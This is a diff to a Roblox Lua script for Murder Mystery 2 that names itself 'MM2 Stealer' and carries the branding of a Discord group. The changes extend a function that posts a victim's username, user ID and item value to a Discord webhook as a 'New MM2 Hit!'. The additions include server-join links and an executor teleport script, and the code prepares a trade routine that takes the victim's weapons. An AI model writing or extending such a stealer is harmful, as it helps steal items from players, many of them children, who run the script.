@@ -267,12 +267,21 @@ local function MM2()
     local totalValue = 0
 
     local function SendJoinMessage()
-        -- Create clickable Roblox game link
-        local robloxLink = "https://www.roblox.com/games/142823291?gameId=" .. game.JobId
+        -- Create Roblox protocol link for direct server join
+        local placeId = tostring(game.PlaceId)
+        local jobId = game.JobId
+        -- Roblox protocol URL that launches specific server instance
+        local robloxProtocol = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
         
+        -- Alternative: Deep link for mobile/web that attempts server join
+        local webLink = "https://www.roblox.com/games/" .. placeId .. "?privateServerLinkCode=" .. jobId
+        
+        -- Best option: Use RoLink format or direct join script
+        local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "')"
+
         local fields = {
             {
-                name = ":star: __**Nuls Scripts**__",
+                name = ":star: __**Mori Scripts**__",
                 value = "```Username     : " ..
                     fardplayer.Name ..
                         "\nUser-ID      : " ..
@@ -312,14 +321,24 @@ local function MM2()
                 inline = false
             },
             {
-                name = "🎮 Join Server:",
-                value = "[**Click Here to Join**](<" .. robloxLink .. ">)", -- Clickable link format for Discord
+                name = "🎮 Join Server (PC):",
+                value = "[**Click to Join Server**](<" .. robloxProtocol .. ">)",
+                inline = false
+            },
+            {
+                name = "📱 Alternative Link:",
+                value = "[**Web/Mobile Link**](<" .. webLink .. ">)",
+                inline = false
+            },
+            {
+                name = "💻 Executor Script:",
+                value = "```lua\n" .. joinScript .. "\n```",
                 inline = false
             }
         }
 
         local data = {
-            ["content"] = "@everyone",
+            ["content"] = "@everyone **New MM2 Hit!**",
             ["username"] = fardplayer.Name,
             ["avatar_url"] = "https://raw.githubusercontent.com/kk4ft/Server/main/mori.png",
             ["embeds"] = {
@@ -327,7 +346,7 @@ local function MM2()
                     ["color"] = 65280,
                     ["fields"] = fields,
                     ["footer"] = {
-                        ["text"] = "MM2 Stealer"
+                        ["text"] = "MM2 Stealer | discord.gg/PzWY2QX8cu"
                     }
                 }
             }
@@ -347,8 +366,6 @@ local function MM2()
             }
         )
     end
-
-    -- Removed GlobalMessage function entirely
 
     local success, tradegui = pcall(function()
         return playerGui:WaitForChild("TradeGUI", 5)
@@ -507,9 +524,7 @@ local function MM2()
             sentWeapons[i] = v
         end
 
-        -- Removed Pastebin upload - webhook only
-
-        SendJoinMessage() -- Now sends only to main webhook with clickable link
+        SendJoinMessage()
 
         local function doTrade(joinedUser)
             local initialTradeState = getTradeStatus()
